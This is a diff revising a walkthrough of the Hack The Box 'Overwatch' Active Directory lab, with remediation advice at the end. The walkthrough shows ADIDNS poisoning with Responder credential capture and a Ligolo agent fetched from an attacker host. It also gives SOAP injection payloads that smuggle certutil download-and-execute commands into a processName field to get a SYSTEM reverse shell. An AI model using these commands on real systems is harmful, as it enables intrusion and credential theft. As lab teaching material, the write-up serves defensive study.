@@ -14,7 +14,7 @@ tags:
   - linked-server
   - wcf
   - command-injection
-objective: "Hardcoded MSSQL credentials leading to ADIDNS poisoning and WCF SOAP RCE"
+objective: "Chain hardcoded MSSQL credentials, ADIDNS poisoning, and a WCF SOAP injection to SYSTEM-level access"
 tools:
   - rustscan
   - nxc
@@ -27,70 +27,81 @@ tools:
   - curl
   - nc
 skill: "ADIDNS poisoning, linked-server credential capture, and SOAP command injection"
-outcome: "SYSTEM shell"
+outcome: "SYSTEM-level command execution on the domain controller"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Server 2022 domain controller (Active Directory) |
+| Starting position | Unauthenticated network access |
+| Objective | Chain hardcoded MSSQL credentials, ADIDNS poisoning, and a WCF SOAP injection to SYSTEM-level access |
+| Outcome | SYSTEM-level command execution on the domain controller |
 
 ## Summary
 
-Overwatch is a Medium-rated Hack The Box Active Directory lab combining credential recovery from a guest-readable SMB share with ADIDNS poisoning and WCF SOAP command injection. A .NET monitoring executable in an unauthenticated SMB share contains hardcoded MSSQL credentials. The database instance exposes a linked server entry that cannot be resolved by DNS; ADIDNS poisoning via krbrelayx's dnstool registers a spoofed A record, and a linked server query triggers cleartext credential capture through Responder. The recovered credentials grant WinRM access. An internal WCF service on port 8000 — reachable only via Ligolo tunnel — exposes a `KillProcess` operation vulnerable to command injection through unsanitised `processName` input, returning a SYSTEM shell. Passwords, hashes, IPs, and flags are redacted; command patterns and technique syntax are preserved.
+Overwatch is a Medium-rated Hack The Box Windows Active Directory lab. A guest-readable `software$` SMB share exposes a .NET monitoring executable whose decompiled source contains hardcoded MSSQL credentials. The database holds a linked server entry with no DNS record; registering a spoofed ADIDNS A record redirects the name to an attacker host, and triggering the linked server query makes the database transmit credentials that Responder captures in cleartext. Those credentials authenticate over WinRM, and an internal-only WCF service — reachable through a Ligolo-ng tunnel — exposes a `KillProcess` operation whose unsanitised `processName` parameter yields command execution as `NT AUTHORITY\SYSTEM`. Passwords, addresses, and flags are replaced with role-based placeholders, and command syntax is preserved. Where the working session retained no console excerpt, the result is stated as recorded.
+
+**Attack path:** **Guest-readable `software$` share → hardcoded MSSQL credentials → ADIDNS-poisoned linked server → cleartext credential capture → WinRM access → Ligolo-ng tunnel → WCF SOAP `KillProcess` injection → SYSTEM**
 
 ## Context and Objective
 
-- **Target:** Windows Server 2022 domain controller on a target domain with DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), MSSQL on non-standard port (6520), and .NET Message Framing (9389)
-- **Starting position:** unauthenticated; no initial credentials provided
-- **Objective:** Enumerate services, obtain initial access, pivot to an internal WCF service, and escalate to domain compromise
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Windows Server 2022 domain controller on `<TARGET_DOMAIN>`, exposing DNS (53), Kerberos (88), LDAP (389/3268), RDP (3389), SMB (445), MSSQL on non-standard port 6520, and .NET Message Framing (9389).
+- **Starting position:** unauthenticated network access; no credentials provided.
+- **Objective:** enumerate the exposed services, obtain an initial foothold, pivot to the internal WCF service, and escalate to SYSTEM.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: standard AD services plus MSSQL on a non-standard port. The non-default port 6520 (standard 1433) suggests deliberate obscurity.
-
-Action: full TCP port scan of the target.
+Observation: a full TCP scan exposes the domain-controller services, including MSSQL on 6520 rather than the default 1433.
 
 ```bash
-rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Overwatch-TCP
+rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
 ```
 
-Representative output (truncated):
+Truncated output:
 
 ```text
-PORT      STATE  SERVICE        VERSION
-53/tcp    open   domain         Simple DNS Plus
-88/tcp    open   kerberos-sec   Microsoft Windows Kerberos
-389/tcp   open   ldap           Microsoft Windows AD LDAP (Domain: <TARGET_DOMAIN>)
-445/tcp   open   microsoft-ds?
-6520/tcp  open   ms-sql-s       Microsoft SQL Server 2022 16.00.1000
-9389/tcp  open   mc-nmf         .NET Message Framing
+389/tcp   open  ldap           Microsoft Windows AD LDAP (Domain: <TARGET_DOMAIN>)
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
+|   DNS_Domain_Name:      <TARGET_DOMAIN>
+|   DNS_Computer_Name:    <TARGET_HOSTNAME>
+|   Product_Version:      10.0.20348
+6520/tcp  open  ms-sql-s       Microsoft SQL Server 2022 16.00.1000
+9389/tcp  open  mc-nmf         .NET Message Framing
 ```
 
-Technical significance: the MSSQL instance on port 6520 is the eventual credential-recovery surface; the .NET Message Framing service indicates AD Web Services.
+Significance: the RDP banner identifies Server build 10.0.20348 (Windows Server 2022); the LDAP domain distinguishes a domain controller; MSSQL on a non-default port is the eventual credential-recovery surface, and the `.NET Message Framing` service indicates AD Web Services.
 
-Result: the recorded output shows an AD domain with MSSQL on a non-standard port and .NET services.
+Result: an Active Directory domain controller is exposed with MSSQL on port 6520.
 
 ### 2. SMB Enumeration — Guest-Readable Share
 
-Observation: unauthenticated SMB access reveals a non-standard `software$` share with read permissions.
-
-Action: enumerate shares, then spider all content.
+Observation: SMB permits an unauthenticated session, and a non-standard `software$` share is readable.
 
 ```bash
 nxc smb <TARGET_IP> -u 'a' -p '' --shares
-nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus
+nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
-Representative finding: `software$` share contains a `monitor` subdirectory with executables and configuration files.
+Truncated output:
 
-Technical significance: a guest-readable share containing compiled application binaries on a domain controller is unusual and warrants static analysis.
+```text
+SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  software$  READ
+```
 
-Result: the recorded output shows a `software$` share readable without authentication containing monitoring executables.
+Significance: a read-only non-standard share on a domain controller is unusual and warrants review; spidering it retrieves a `monitor` directory containing `overwatch.exe` and `overwatch.exe.config`.
+
+Result: a guest-readable share holding monitoring binaries and configuration is identified and retrieved.
 
 ### 3. Static Analysis — Hardcoded Credentials
 
-Observation: decompiling `overwatch.exe` with ILSpy reveals a hardcoded SQL connection string.
-
-Action: open the binary in a .NET decompiler and inspect connection logic.
+Observation: decompiling `overwatch.exe` with ILSpy exposes a hardcoded SQL connection string.
 
 ```csharp
 SqlConnection val = new SqlConnection(
@@ -98,33 +109,31 @@ SqlConnection val = new SqlConnection(
 );
 ```
 
-Technical significance: hardcoded credentials in a compiled binary recoverable by any .NET decompiler; the `software$` share being guest-readable means anonymous SMB access immediately yields database credentials.
+Significance: credentials embedded in a distributed binary are recoverable by any .NET decompiler, and because the share is guest-readable, anonymous SMB access immediately yields database credentials.
 
-Result: the recorded output shows recovered MSSQL service account credentials.
+Result: MSSQL service account credentials are recovered from the binary.
 
 ### 4. Static Analysis — WCF Service Configuration
 
-Observation: `overwatch.exe.config` reveals an internal WCF service on port 8000.
+Observation: `overwatch.exe.config` declares an internal WCF service on port 8000.
 
 ```xml
 <service name="MonitoringService">
   <host>
     <baseAddresses>
-      <add baseAddress="http://<TARGET_HOSTNAME>:8000/<SERVICE_PATH>" />
+      <add baseAddress="http://<TARGET_DOMAIN>:8000/MonitorService" />
     </baseAddresses>
   </host>
 </service>
 ```
 
-Technical significance: port 8000 did not appear in the external port scan, confirming it is internal-only and requires pivoting to reach.
+Significance: port 8000 did not appear in the external scan, so the endpoint is bound internally and will require a pivot before it can be reached.
 
-Result: the recorded output shows an internal WCF service endpoint bound to localhost.
+Result: an internal-only WCF endpoint is identified on port 8000.
 
 ### 5. MSSQL Access — Linked Server Discovery
 
-Observation: connecting to the SQL instance with recovered credentials and enumerating linked servers reveals `<LINKED_SERVER_NAME>`, which cannot be resolved by DNS.
-
-Action: connect to MSSQL and query linked servers.
+Observation: the recovered service account authenticates to MSSQL, and enumerating linked servers reveals `<LINKED_SERVER_NAME>`, a name that does not resolve in DNS.
 
 ```bash
 impacket-mssqlclient <TARGET_DOMAIN>/<SQL_SERVICE_ACCOUNT>:'<SQL_SVC_PASSWORD>'@<TARGET_IP> \
@@ -133,25 +142,38 @@ impacket-mssqlclient <TARGET_DOMAIN>/<SQL_SERVICE_ACCOUNT>:'<SQL_SVC_PASSWORD>'@
 
 ```sql
 SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;
+```
+
+```text
+<LINKED_SERVER_NAME>  SQLNCLI  SQL Server  <LINKED_SERVER_NAME>
+```
+
+A query against the linked server fails:
+
+```sql
 SELECT * FROM [<LINKED_SERVER_NAME>].master.sys.databases;
 ```
 
-Representative finding: the linked server query returns a login timeout error — `<LINKED_SERVER_NAME>` has no DNS record.
+```text
+Login timeout expired
+A network-related or instance-specific error has occurred while establishing a
+connection to SQL Server. Server is not found or not accessible.
+```
 
-Technical significance: an unresolvable linked server name presents an ADIDNS poisoning opportunity; if a spoofed DNS record redirects `<LINKED_SERVER_NAME>` to an attacker-controlled host, the MSSQL server transmits credentials when the linked server query is triggered.
+Significance: an unresolvable linked server name is a poisoning opportunity — if the name resolves to an attacker host when the query is triggered, the database will attempt to authenticate there.
 
-Result: the recorded output shows a linked server entry with no corresponding DNS resolution.
+Result: a linked server entry is present and its name has no DNS record.
 
 ### 6. ADIDNS Poisoning — Credential Capture
 
-Observation: Active Directory Integrated DNS stores DNS records as AD objects. By default, any authenticated domain user can create new DNS records. Since the recovered service account is a domain account, it can write a spoofed A record for `<LINKED_SERVER_NAME>`.
-
-Action: inject a DNS record pointing `<LINKED_SERVER_NAME>` to the attacker, start Responder, and trigger the linked server query.
+Observation: AD-integrated DNS stores records as AD objects, and by default a domain-authenticated user can create new records. The recovered service account is such a user, so it can register a spoofed A record for `<LINKED_SERVER_NAME>`.
 
 ```bash
 python3 dnstool.py -u '<TARGET_DOMAIN>\<SQL_SERVICE_ACCOUNT>' -p '<SQL_SVC_PASSWORD>' \
   -r '<LINKED_SERVER_NAME>' -a add -d '<ATTACKER_IP>' <TARGET_IP>
 ```
+
+With a listener running, the linked server query is triggered again:
 
 ```bash
 sudo responder -I tun0
@@ -161,8 +183,6 @@ sudo responder -I tun0
 EXEC ('SELECT name FROM sys.databases') AT [<LINKED_SERVER_NAME>];
 ```
 
-Representative finding: Responder captures cleartext MSSQL credentials from the linked server authentication attempt.
-
 ```text
 [MSSQL] Cleartext Client   : <TARGET_IP>
 [MSSQL] Cleartext Hostname : <LINKED_SERVER_NAME> ()
@@ -170,25 +190,25 @@ Representative finding: Responder captures cleartext MSSQL credentials from the 
 [MSSQL] Cleartext Password : <SQL_MGMT_PASSWORD>
 ```
 
-Technical significance: MSSQL linked server connections using the SQLNCLI provider with SQL Server authentication transmit credentials via TDS (Tabular Data Stream). When connecting to a non-SQL endpoint, the authentication phase transmits credentials in a form Responder parses as cleartext — distinct from Windows authentication, which produces an NTLMv2 hash.
+Significance: linked-server connections that use the SQLNCLI provider with SQL Server authentication transmit the login over TDS; against a non-SQL endpoint the authentication phase arrives in a form Responder parses as cleartext, distinct from Windows authentication, which would produce an NTLMv2 hash.
 
-Result: the recorded output shows captured cleartext credentials for a second MSSQL account.
+Result: cleartext credentials for a second MSSQL account are captured.
 
 ### 7. WinRM Access — Initial Foothold
 
-Observation: the recovered SQL management credentials authenticate via WinRM.
-
-Action: establish a WinRM session.
+Observation: the captured account authenticates over WinRM.
 
 ```bash
 evil-winrm -i <TARGET_IP> -u '<SQL_MANAGEMENT_ACCOUNT>' -p '<SQL_MGMT_PASSWORD>'
 ```
 
-Result: the recorded output shows a WinRM session established; user flag obtained.
+Significance: WinRM provides an interactive PowerShell session, moving from a captured credential to host-level command execution.
+
+Result: an authenticated user-level shell is obtained on the target.
 
 ### 8. Internal Service Discovery — WCF on Port 8000
 
-Observation: `netstat -ano` confirms port 8000 listening internally, consistent with the WCF configuration. Process ID 4 indicates the service runs as `NT AUTHORITY\SYSTEM`.
+Observation: `netstat` confirms port 8000 listening internally, owned by process ID 4.
 
 ```powershell
 netstat -ano | findstr LISTEN
@@ -198,15 +218,17 @@ netstat -ano | findstr LISTEN
 TCP    0.0.0.0:8000    0.0.0.0:0    LISTENING    4
 ```
 
-Technical significance: the WCF service is internal-only and runs as SYSTEM — a high-value target for command injection.
+Significance: PID 4 is the System process, so the service runs as `NT AUTHORITY\SYSTEM`; a SYSTEM-owned service reachable only inside the host is a high-value target for command injection.
 
-Result: the recorded output confirms the WCF service is reachable only from within the target.
+Result: the WCF service listens internally and runs as SYSTEM.
 
 ### 9. Port Forwarding via Ligolo-ng
 
-Observation: the WCF service is bound to localhost; Ligolo-ng creates a transparent proxy tunnel to reach it.
+Observation: the WCF service listens on `0.0.0.0:8000`, but port 8000 had no external exposure, so a Ligolo-ng tunnel is used to reach it from the attack machine.
 
-Action: deploy Ligolo agent on the target and add a route on the attack machine.
+```bash
+sudo ./proxy -selfcert
+```
 
 ```powershell
 iwr -OutFile C:\Windows\Temp\agent.exe http://<ATTACKER_IP>/agent.exe
@@ -217,13 +239,13 @@ iwr -OutFile C:\Windows\Temp\agent.exe http://<ATTACKER_IP>/agent.exe
 sudo ip route add <PIVOT_IP>/32 dev ligolo
 ```
 
-Technical significance: Ligolo-ng routes traffic to `<PIVOT_IP>` to `127.0.0.1` on the target, making the internal WCF service reachable at `http://<PIVOT_IP>:8000/MonitorService`.
+Significance: Ligolo-ng maps traffic to `<PIVOT_IP>` through the target's network stack, making the internal-only endpoint reachable at `http://<PIVOT_IP>:8000/MonitorService`.
 
-Result: the recorded output shows the tunnel established and the WCF service reachable.
+Result: the internal WCF service becomes reachable from the attack machine.
 
 ### 10. WCF SOAP Service Analysis
 
-Observation: fetching the WSDL describes an `IMonitoringService` interface with a `KillProcess` operation accepting a `processName` string.
+Observation: fetching the WSDL describes an `IMonitoringService` interface whose `KillProcess` operation takes a single `processName` string.
 
 ```bash
 curl -s http://<PIVOT_IP>:8000/MonitorService?wsdl
@@ -239,18 +261,16 @@ curl -s http://<PIVOT_IP>:8000/MonitorService?wsdl
 </xs:element>
 ```
 
-Technical significance: a SYSTEM-level service accepting an unsanitised string passed to a process-killing routine creates a command injection opportunity if the value reaches `cmd.exe` or PowerShell without validation.
+Significance: a SYSTEM-level service that accepts an unsanitised string and uses it in a process-killing routine is an injection candidate if the value reaches `cmd.exe` or PowerShell without validation.
 
-Result: the recorded output shows the WSDL schema with the injectable parameter.
+Result: an injectable string parameter is identified in the WSDL.
 
 ### 11. Command Injection — Proof of Concept
 
-Observation: injecting a semicolon-delimited command through `processName` executes as SYSTEM.
-
-Action: send a SOAP payload creating a file to confirm code execution.
+Observation: a semicolon-delimited command placed in `processName` executes in the service's SYSTEM context.
 
 ```xml
-<tem:processName>notepad.exe ; type nul > C:\Users\<WINRM_USER>\Documents\test_rce</tem:processName>
+<tem:processName>notepad.exe ; type nul > C:\Users\<SQL_MANAGEMENT_ACCOUNT>\Documents\test_rce</tem:processName>
 ```
 
 ```bash
@@ -260,57 +280,67 @@ curl -s -X POST http://<PIVOT_IP>:8000/MonitorService \
   --data @poc.xml
 ```
 
-Result: the recorded output shows the file exists in the target's Documents folder, confirming command injection.
+Significance: the `processName` value is passed to an OS shell without validation, so injected shell metacharacters are interpreted.
+
+Result: the created marker file confirms command injection in the SYSTEM context.
 
 ### 12. SYSTEM Shell via SOAP Command Injection
 
-Observation: the confirmed injection point allows deploying and executing a reverse shell as SYSTEM.
-
-Action: stage a PowerShell reverse shell via `certutil`, then execute it through the SOAP endpoint.
+Observation: the confirmed injection point can fetch and execute a payload in the SYSTEM context.
 
 ```xml
-<tem:processName>notepad.exe ; certutil -urlcache -split -f <REMOTE_BINARY> C:\Users\<WINRM_USER>\Documents\shell.ps1</tem:processName>
+<tem:processName>notepad.exe ; certutil -urlcache -split -f <REMOTE_BINARY> C:\Users\<SQL_MANAGEMENT_ACCOUNT>\Documents\shell.ps1</tem:processName>
 ```
 
 ```xml
-<tem:processName>notepad.exe ; C:\Users\<WINRM_USER>\Documents\shell.ps1</tem:processName>
+<tem:processName>notepad.exe ; C:\Users\<SQL_MANAGEMENT_ACCOUNT>\Documents\shell.ps1</tem:processName>
 ```
 
 ```bash
 nc -lvnp 9001
 ```
 
-Representative finding: the reverse shell connects back as SYSTEM.
-
 ```text
 PS C:\Software\Monitoring> whoami
 nt authority\system
 ```
 
-Technical significance: the full chain — from guest-readable SMB share to SYSTEM — required no CVEs; each step exploited a configuration weakness or missing input validation.
+Significance: the chain from a guest-readable share to SYSTEM required no CVE; every step relied on a configuration weakness or missing input validation.
 
-Result: the recorded output shows a SYSTEM shell; root flag obtained.
+Result: a SYSTEM-level shell is obtained on the domain controller.
 
 ## Challenges and Decisions
 
-- **Non-standard MSSQL port:** the SQL instance on port 6520 rather than the default 1433 required targeted scanning; the non-standard port did not prevent exploitation once discovered.
-- **ADIDNS poisoning surface:** by default, any authenticated domain user can create DNS records in ADIDNS; the linked server's SQLNCLI provider transmits credentials in cleartext to non-SQL endpoints, making credential capture trivial once DNS is controlled.
-- **Internal-only WCF service:** port 8000 was not visible externally, requiring Ligolo-ng tunneling; the service ran as SYSTEM (PID 4), making the injection immediately high-impact.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| The internal WCF service on port 8000 was not reachable from the attack machine | Reached the internal-only service through a Ligolo-ng transparent tunnel | The endpoint was not reachable externally |
+| The linked server query timed out because `<LINKED_SERVER_NAME>` had no DNS record | Registered a spoofed ADIDNS A record pointing the name at the attack host | Forces the database to authenticate to an attacker-controlled endpoint |
 
 ## Outcome
 
-The recorded evidence establishes a complete attack chain from unauthenticated access to SYSTEM-level compromise through five linked weaknesses: guest-readable SMB share with hardcoded credentials, ADIDNS poisoning exploiting default write permissions, linked server cleartext authentication, WinRM access, and SOAP command injection in a SYSTEM-level service. No CVEs were required; each step exploited configuration weaknesses or missing input validation.
+The evidence establishes SYSTEM-level command execution on the domain controller and, with it, effective domain compromise, reached without exploiting a single CVE. LDAP, Kerberos, and RDP were exposed but not used in the path; every step rested on misconfiguration or missing input validation.
 
 ## Lessons and Recommendations
 
-- **Never hardcode credentials in compiled binaries.** Connection strings must use encrypted configuration stores, Windows DPAPI-protected files, or managed service accounts. Placing binaries with hardcoded production credentials in a guest-readable SMB share means anonymous access immediately yields database access.
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. These actions are recommendations; none was validated in the lab.
 
-- **Restrict ADIDNS write permissions.** Apply DNS-specific ACLs to prevent non-administrator accounts from creating arbitrary DNS records. Monitor for unexpected A record creation, particularly for names matching linked server configurations.
-
-- **Sanitise input in privileged service operations.** The `KillProcess` SOAP operation passed its parameter directly to an OS-level execution context without validation. Any SYSTEM-level service accepting external input must validate against a whitelist and must never pass input to a shell interpreter. Running the service as a dedicated least-privilege account would contain the blast radius.
-
-- **Use Windows authentication for linked servers.** SQL Server authentication on linked server connections transmits credentials in cleartext via TDS when connecting to non-SQL endpoints. Windows (Kerberos) authentication avoids this exposure.
+1. **Hardcoded credentials in a distributed binary.** `overwatch.exe` embedded a SQL connection string and sat in a guest-readable share, so anonymous access immediately yielded database credentials. *Recommendation:* keep secrets out of compiled artifacts — use protected configuration stores, DPAPI-protected files, or managed service accounts, and require authentication on shares holding application software. *Detection:* scan build artifacts and shares for embedded secrets.
+2. **Default ADIDNS write permissions.** Any authenticated account could register the spoofed record that redirected the linked server. *Recommendation:* restrict DNS record creation with DNS-specific ACLs and review which principals can create records in AD-integrated zones. *Detection:* monitor for unexpected A-record creation, especially names matching configured linked servers.
+3. **Linked servers using SQL authentication.** The SQLNCLI linked-server connection transmitted credentials that Responder parsed as cleartext against a non-SQL endpoint. *Recommendation:* use Windows (Kerberos) authentication for linked servers, and restrict who may create them. *Detection:* alert on SQL authentication to unexpected hosts from database servers.
+4. **Unsanitised input in a SYSTEM-level service.** The `KillProcess` operation passed `processName` to an OS shell, yielding SYSTEM command execution. *Recommendation:* validate the parameter against a whitelist, never pass external input to a shell, and run the service under a least-privilege account instead of SYSTEM. *Detection:* monitor the service for process names containing shell metacharacters.
 
 ## References
 
-- Platform: Hack The Box — Medium Windows Active Directory machine — [Overwatch](https://app.hackthebox.com/machines/Overwatch)
+- [Hack The Box — Overwatch](https://app.hackthebox.com/machines/Overwatch) (retired machine)
+- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
+- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) (SMB enumeration and share spidering)
+- [ILSpy](https://github.com/icsharpcode/ILSpy) (.NET decompiler)
+- [Impacket — `mssqlclient`](https://github.com/fortra/impacket) (MSSQL client)
+- [krbrelayx — `dnstool.py`](https://github.com/dirkjanm/krbrelayx) (ADIDNS record manipulation)
+- [Responder](https://github.com/lgandx/Responder) (rogue authentication server)
+- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) (transparent network tunnel)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
+- [Microsoft — Dynamic DNS Update in Windows and Windows Server](https://learn.microsoft.com/en-us/windows-server/networking/dns/dynamic-update) (AD-integrated zone dynamic-update behavior)
+- [Microsoft — Linked Servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine)
+- [Microsoft — Create Linked Servers (SQL Server Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine)
+- [What is Windows Communication Foundation (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf)
